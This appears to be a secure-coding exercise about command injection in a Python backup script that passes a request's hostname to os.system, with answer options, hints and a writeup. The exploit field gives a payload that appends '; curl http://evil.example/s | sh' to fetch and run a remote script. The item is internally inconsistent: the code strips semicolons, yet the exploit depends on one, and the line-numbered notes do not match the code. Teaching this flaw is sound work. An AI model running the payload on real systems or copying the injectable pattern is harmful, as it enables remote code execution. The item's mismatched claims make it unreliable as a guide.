files.name: backup.py

notes.5: Runs `ping` by handing a string to the system shell, with `hostname` appended to it.
notes.6: Builds an rsync command string with the hostname substituted in twice.
notes.7: Runs that rsync command through the shell.
notes.8: Returns the local path the backup was written to.
notes.11: Reads the `host` field straight from the incoming request.

options.label: `ping` needs root privileges, so the call fails for unprivileged web users
options.whyWrong: Privilege level isn't the issue; the problem is that the shell interprets the input before anything runs.

options.label: `os.system` hands the whole assembled string to `/bin/sh`, so shell metacharacters in `hostname` run as separate commands
The return value exposes the internal backup directory path to the user
options.whyWrong: Leaking a path name is minor and unrelated to the command execution flaw.

options.label: Quote the hostname inside the shell string
options.whyWrong: Single quotes are defeated by a `'` in the input, which closes the quote and restarts command context. Quoting by hand is not a reliable boundary.

options.label: Remove semicolons from the hostname
options.whyWrong: Shells offer many other separators (`|`, `&&`, `$(...)`, backticks, newlines). Denylisting one character leaves the rest open.

options.label: Pass arguments as a list with shell=False (subprocess)
options.diff:
-    os.system("ping -c 1 " + hostname)
+    subprocess.run(["ping", "-c", "1", hostname], check=True)
-    cmd = "rsync -az %s:/var/www/ ./backups/%s/" % (hostname, hostname)
-    os.system(cmd)
+    subprocess.run(["rsync", "-az", f"{hostname}:/var/www/", f"./backups/{hostname}/"], check=True)

options.label: Run the commands as an unprivileged user
options.diff:
-    os.system("ping -c 1 " + hostname)
+    os.system("sudo -u nobody ping -c 1 " + hostname)
options.whyWrong: Dropping privileges limits blast radius but the input is still parsed by a shell, so arbitrary commands still run (as nobody).

training.exploit: Submit `host=localhost; curl http://evil.example/s | sh`. `ping -c 1 localhost` runs, then the shell sees the `;` and executes `curl ... | sh`, downloading and running the attacker's script as the web user. `$(...)`, backticks, `&&`, and `|` work too.

hints.line: Which calls pass a built-up string to the operating system?
hints.bugClass: The input reaches a shell, not a database.
hints.why: What does `/bin/sh` do with a `;` in the middle of the string?
hints.fix: Don't involve a shell at all — pass arguments as a list.

writeup.summary: `os.system` hands its string to `/bin/sh`, so any shell metacharacter in `hostname` is interpreted. A host of `localhost; curl evil.sh | sh` runs the attacker's command. The fix stops using a shell at all: `subprocess.run([...])` with a list passes `hostname` as a single argv element, so it can never be parsed as a command. Note line 6 has the same flaw — a complete fix converts both calls.

files.code:
import os

def backup_site(hostname):
    # Ping the host, then rsync its web root into local backups.
    hostname = hostname.replace(";", "")
    os.system("ping -c 1 " + hostname)
    cmd = "rsync -az %s:/var/www/ ./backups/%s/" % (hostname, hostname)
    os.system(cmd)
    return "./backups/" + hostname

def handle_request(form):
    host = form.get("host")
    return backup_site(host)
